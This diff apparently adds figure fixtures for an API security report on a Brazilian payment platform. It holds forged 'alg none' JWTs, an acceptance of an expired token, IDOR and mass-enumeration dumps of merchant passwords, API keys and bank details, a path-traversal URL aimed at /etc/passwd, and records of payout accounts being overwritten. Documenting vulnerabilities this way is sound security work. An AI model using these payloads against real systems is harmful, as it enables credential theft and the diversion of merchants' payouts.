@@ -1,0 +1,68 @@
+@@TOKEN_ATK@@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtXzQ4MjEiLCJpYXQiOjE3OTE0MDUxODZ9.cvJbfjbHQjt0YC2oqC-mz1dkx4T_tABy7UqMlzBPhvY
+@@NONE_0093@@ eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJtXzAwOTMifQ.
+@@NONE_ANON@@ eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbm9uIn0.
+@@HS_5117@@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtXzUxMTciLCJpYXQiOjE3OTE0MDUxODZ9.n_K0SQrmIvV5oyCDpqosGxymVObJsWAStsjeI-U22sU
+@@EXP_5117@@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtXzUxMTciLCJpYXQiOjE3MDAwMDAwMDAsImV4cCI6MTcwMDAwMzYwMH0.XNy5ugwPSWYKtVs9JG8sOeNYG140ZnK8SSqVYHyB4A8
+===FIG7_PAYLOAD===
+{"sub":"m_4821","iat":1791405186}
+===FIG1_ALGNONE_READ===
+HTTP 200
+{
+  "id": "m_0093",
+  "nome": "Curso Viver de Renda LTDA",
+  "email": "financeiro@viverderenda.com",
+  "senha": "arara123",
+  "api_key": "sk_live_m0093_8f2a1c",
+  "webhook_secret": "whsec_plataforma_unico",
+  "payout_banco": "237",
+  "payout_agencia": "0001",
+  "payout_conta": "12345-6",
+  "payout_cpf_cnpj": "11222333000181",
+  "saldo_centavos": 4820000
+}
+===FIG3_SECRET_READ===
+HTTP 200
+nome: Ebook Emagrecimento Real
+api_key: sk_live_m5117_c1d4f0  senha: mudar123
+===FIG5_IDOR_READ===
+HTTP 200
+{
+  "id": "m_5117",
+  "nome": "Ebook Emagrecimento Real",
+  "email": "adm@emagrecimentoreal.com",
+  "senha": "mudar123",
+  "api_key": "sk_live_m5117_c1d4f0",
+  "webhook_secret": "whsec_plataforma_unico",
+  "payout_banco": "260",
+  "payout_agencia": "0001",
+  "payout_conta": "55555-5",
+  "payout_cpf_cnpj": "77888999000110",
+  "saldo_centavos": 1870000
+}
+===FIG6_MASS_ENUM===
+m_0093  arara123   sk_live_m0093_8f2a1c   whsec_plataforma_unico
+m_4821  senha2024  sk_live_m4821_3b9e7d   whsec_plataforma_unico
+m_5117  mudar123   sk_live_m5117_c1d4f0   whsec_plataforma_unico
+===FIG8_EXPIRED===
+payload: {"sub":"m_5117","iat":1700000000,"exp":1700003600}
+HTTP 200
+===FIG10_TRAVERSAL===
+{
+  "merchant": "m_4821",
+  "download_url": "https://arara-conciliacao.s3.amazonaws.com/relatorios/../../../../etc/passwd",
+  "arquivo": "relatorios/../../../../etc/passwd"
+}
+===FIG9_LOG_TRIGGER===
+(log capturado abaixo)
+===FIG4_BOLA_BEFORE===
+237 0001 12345-6 11222333000181
+===FIG4_BOLA_POST===
+HTTP 201
+===FIG4_BOLA_AFTER===
+999 6666 00000-0 00000000000000
+===FIG2_CHAIN_BEFORE===
+341 2020 98765-4 44555666000199
+===FIG2_CHAIN_POST===
+HTTP 201
+===FIG2_CHAIN_AFTER===
+001 0001 13337-0 00000000000000
